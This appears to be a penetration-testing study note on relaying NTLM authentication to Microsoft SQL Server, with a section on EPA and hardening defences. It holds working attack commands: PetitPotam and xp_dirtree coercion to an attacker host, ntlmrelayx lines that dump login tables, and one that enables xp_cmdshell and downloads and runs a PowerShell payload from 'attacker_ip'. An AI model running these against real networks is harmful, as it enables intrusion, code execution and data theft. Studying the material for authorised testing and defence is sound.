---
tags: [active-directory, advanced, exotic, cross-forest, vapt]
difficulty: advanced
module: "78 - Active Directory Exotic Protocols and Cross-Forest"
topic: "78.08 Advanced NTLM Relaying to MSSQL"
---

# Advanced NTLM Relaying to MSSQL

## 1. Introduction to NTLM Relaying and MSSQL

NTLM Relaying is a cornerstone of Active Directory exploitation. Traditionally, the focus of NTLM relay attacks has been on relaying authentication to SMB (to gain remote code execution) or HTTP/HTTPS (to manipulate Active Directory via LDAP/LDAPS, AD CS, or EWS). However, relaying NTLM authentication to Microsoft SQL Server (MSSQL) presents a highly lucrative and often overlooked attack vector.

MSSQL environments are ubiquitous in enterprise networks, frequently serving as backend databases for critical applications, identity management systems, and centralized logging servers. Because MSSQL supports NTLM authentication by default, it is a viable target for relay attacks. The objective is to coerce an Active Directory account (preferably a machine account or an administrative user) to authenticate to an attacker-controlled machine, and then relay that authentication directly to a target MSSQL instance.

If the relayed account has administrative privileges (`sysadmin`) on the SQL server, or if the server suffers from configuration weaknesses (like excessive database permissions), the attacker can achieve remote code execution, extract sensitive data, or establish lateral movement vectors.

### 1.1 The Mechanics of MSSQL NTLM Authentication

When a client connects to an MSSQL server using Windows Authentication, the process relies on the underlying SSPI (Security Support Provider Interface). If Kerberos fails or is unavailable (for example, if the SPN is incorrect, or if the attacker is forcing NTLM via an IP address instead of a hostname), the authentication falls back to NTLM.

The NTLM handshake over the Tabular Data Stream (TDS) protocol (the application-level protocol used by MSSQL) follows the standard three-step process:
1.  **NEGOTIATE:** The client sends an NTLM Negotiate message to the MSSQL server.
2.  **CHALLENGE:** The MSSQL server responds with an NTLM Challenge.
3.  **AUTHENTICATE:** The client responds with the NTLM Authenticate message containing the computed response.

An attacker positioned in the middle can intercept these messages and relay them to the target MSSQL server, successfully authenticating as the coerced client.

---

## 2. Coercion Methods

To successfully relay authentication, the attacker must first coerce the victim machine to authenticate to the attacker's listener. Several methods can be employed:

### 2.1 Standard Coercion (RPC/SMB)
Tools like PetitPotam (MS-EFSRPC), PrinterBug (MS-RPRN), or ShadowCoerce (MS-FSRVP) can be used to force a target machine (e.g., a Domain Controller or a highly privileged application server) to authenticate to the attacker's IP address over SMB.

### 2.2 WebDAV and HTTP Coercion
If SMB signing is enforced on the target MSSQL server, relaying from SMB to SMB is impossible. Furthermore, modern Windows versions block cross-protocol relaying from SMB to other protocols (like HTTP or MSSQL) to mitigate the "Drop the Mic" vulnerability (CVE-2019-1040).

To bypass this, attackers often coerce authentication over HTTP/WebDAV. By using tools like `SpoolSample` pointing to an attacker-controlled WebDAV share (e.g., `\\\\attacker_ip@80\\test`), the victim machine is forced to authenticate using HTTP. The attacker can then safely relay this HTTP NTLM authentication to the MSSQL service via TDS.

### 2.3 SQL Server Coercion (`xp_dirtree`)
Interestingly, MSSQL servers themselves can be coerced into authenticating. If an attacker has low-level access to a SQL server, they can execute stored procedures like `xp_dirtree` or `xp_fileexist` pointing to a UNC path.
```sql
EXEC master..xp_dirtree '\\attacker_ip\share';
```
This forces the MSSQL service account to authenticate to the attacker, which can then be relayed to another MSSQL instance or an entirely different service.

---

## 3. Exploiting the Relayed Connection

Once the authentication is successfully relayed to the target MSSQL server, the attacker's capabilities depend entirely on the permissions of the relayed account on that specific SQL instance.

### 3.1 Gaining Remote Code Execution (`xp_cmdshell`)
If the relayed account possesses the `sysadmin` server role, the most direct path to exploitation is enabling and executing `xp_cmdshell`.

Using `ntlmrelayx.py`, an attacker can automatically execute queries upon successful relay:
```bash
# Relaying HTTP to MSSQL and executing a command
ntlmrelayx.py -t mssql://target_sql.corp.local -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString(''http://attacker_ip/payload.ps1'')\"';"
```

### 3.2 Abuse of SQL Server Agent
If `xp_cmdshell` is strictly monitored or disabled, the `sysadmin` can leverage the SQL Server Agent to execute arbitrary operating system commands. The attacker can create a temporary SQL Agent Job consisting of an `Operating system (CmdExec)` step and trigger it.

### 3.3 Database Dumping and Data Exfiltration
If the goal is data theft rather than code execution, the relayed session can be used to query sensitive tables. For example, if relaying an authentication to an SCCM database, the attacker can query the `Network_Access_Account` tables to extract credentials used for software deployment.
```bash
ntlmrelayx.py -t mssql://target_sql.corp.local -q "SELECT * FROM master.dbo.syslogins; SELECT * FROM [SensitiveDB].[dbo].[Users];"
```

### 3.4 Trust Links and Lateral Movement (SQL Linking)
MSSQL servers are frequently linked to one another to allow cross-server queries. If the relayed account has access to a SQL server that is linked to a more sensitive server (e.g., a Tier 0 database), the attacker can execute queries over the RPC link using `OPENQUERY`.
```sql
SELECT * FROM OPENQUERY("LINKED_SERVER_NAME", 'SELECT SYSTEM_USER');
```
This can be chained to enable `xp_cmdshell` on the linked server, bypassing primary defenses.

---

## 4. Visualizing the Relay Architecture

The following diagram illustrates the HTTP-to-MSSQL relay attack flow, bypassing SMB cross-protocol restrictions.

```text
+---------------------+           +------------------------+          +-------------------------+
| Victim Server       |           | Attacker Machine       |          | Target MSSQL Server     |
| (e.g., Print Spooler|           | (Running ntlmrelayx)   |          | (Vulnerable to Relay)   |
|  or Application Srv)|           | IP: 192.168.1.50       |          | IP: 192.168.1.100       |
+---------+-----------+           +-----------+------------+          +------------+------------+
          |                                   |                                    |
          | 1. Trigger Coercion (PetitPotam)  |                                    |
          |<----------------------------------+                                    |
          |    RPC Call pointing to WebDAV    |                                    |
          |    (\\192.168.1.50@80\test)     |                                    |
          |                                   |                                    |
          | 2. HTTP GET /test (NTLM Negotiate)|                                    |
          +---------------------------------->|                                    |
          |                                   | 3. Relayed NTLM Negotiate (TDS)    |
          |                                   +----------------------------------->|
          |                                   |                                    |
          |                                   | 4. NTLM Challenge (TDS)            |
          | 5. HTTP 401 Auth Required         |<-----------------------------------+
          |    (NTLM Challenge)               |                                    |
          |<----------------------------------+                                    |
          |                                   |                                    |
          | 6. HTTP GET (NTLM Auth Response)  |                                    |
          +---------------------------------->|                                    |
          |                                   | 7. Relayed NTLM Auth Response      |
          |                                   +----------------------------------->|
          |                                   |                                    |
          |                                   | 8. Auth Success (TDS)              |
          |                                   |<-----------------------------------+
          |                                   |                                    |
          |                                   | 9. Execute SQL Query / xp_cmdshell |
          |                                   +===================================>|
          |                                   |    Code Execution as SQL Svc Acct  |
          +-----------------------------------+------------------------------------+
```

---

## 5. Execution Scenario: Domain Controller to MSSQL

Consider a scenario where a Domain Controller (`DC01`) machine account is a member of the local `Administrators` group on a backend SQL server (`SQL01`), or is explicitly granted `sysadmin` rights due to a misconfiguration in SCCM or an identity management tool.

1.  **Setup the Listener:** The attacker starts `ntlmrelayx.py` targeting the MSSQL server and configures the payload to execute a reverse shell.
    ```bash
    ntlmrelayx.py -t mssql://sql01.corp.local -smb2support -c "powershell -c ..."
    ```
2.  **Trigger Authentication:** The attacker uses `PetitPotam` against `DC01` to force it to authenticate to the attacker's machine using WebDAV.
    ```bash
    petitpotam.py 192.168.1.50@80/test dc01.corp.local
    ```
3.  **Relay and Exploit:** `DC01$` authenticates to the attacker via HTTP. `ntlmrelayx.py` intercepts the hashes and relays the authentication to `SQL01` over TDS. Because `DC01$` is a `sysadmin` on `SQL01`, the connection is successful, and `ntlmrelayx.py` automatically enables and triggers `xp_cmdshell`, resulting in a reverse shell as the `MSSQLSERVER` service account.

---

## 6. Defensive Considerations and Mitigation

Protecting against MSSQL NTLM relaying involves hardening both the authentication protocols and the SQL server configurations.

### 6.1 Enforce Extended Protection for Authentication (EPA)
The most effective defense against NTLM relay attacks on MSSQL is enabling Extended Protection for Authentication. EPA binds the SSPI authentication to the specific TLS channel (Channel Binding) and verifies the Service Principal Name (SPN) of the target server. If an attacker attempts to relay the authentication, the SPN in the inner NTLM payload will not match the attacker's service, and the channel binding will fail, blocking the connection.

### 6.2 Disable NTLM
Where possible, disable NTLM authentication entirely within the Active Directory domain, forcing all services to use Kerberos. MSSQL natively supports Kerberos as long as SPNs are configured correctly.

### 6.3 Restrict SQL Server Permissions
Adhere to the principle of least privilege within the MSSQL environment.
-   Do not grant `sysadmin` rights to Domain Controllers, machine accounts, or generic service accounts unless absolutely strictly required.
-   Disable `xp_cmdshell`, `OLE Automation Procedures`, and other dangerous extended stored procedures by default.
-   Implement rigorous monitoring of `sp_configure` changes.

### 6.4 Implement SMB Signing and Block Coercion
While SMB signing does not prevent WebDAV/HTTP relaying, it is part of a defense-in-depth strategy. Furthermore, implement RPC filters to block coercion protocols like MS-EFSRPC (PetitPotam) and MS-RPRN (PrinterBug) from traversing non-essential network segments.

---

## 7. Chaining Opportunities

- **[[09 - PrinterBug and PetitPotam Alternatives]]**: If traditional coercion methods are patched, alternative coercion techniques must be utilized to force the authentication to the attacker's relay server.
- **[[06 - Exploiting Microsoft Identity Manager MIM]]**: If the MIM service account is relayed to the MIM backend SQL database, an attacker can manipulate the Metaverse database, injecting malicious synchronization rules.
- **[[10 - Abuse of Exchange Web Services in AD]]**: Exchange servers often have excessive privileges. Relaying an Exchange server's machine account to an MSSQL instance can lead to immediate remote code execution.

## 8. Related Notes

- [[02 - Exploiting MS-EFSRPC PetitPotam]]
- [[03 - Cross-Forest Trust Abuse via SID History]]
- [[05 - Windows Defender Application Control WDAC Evasion]]
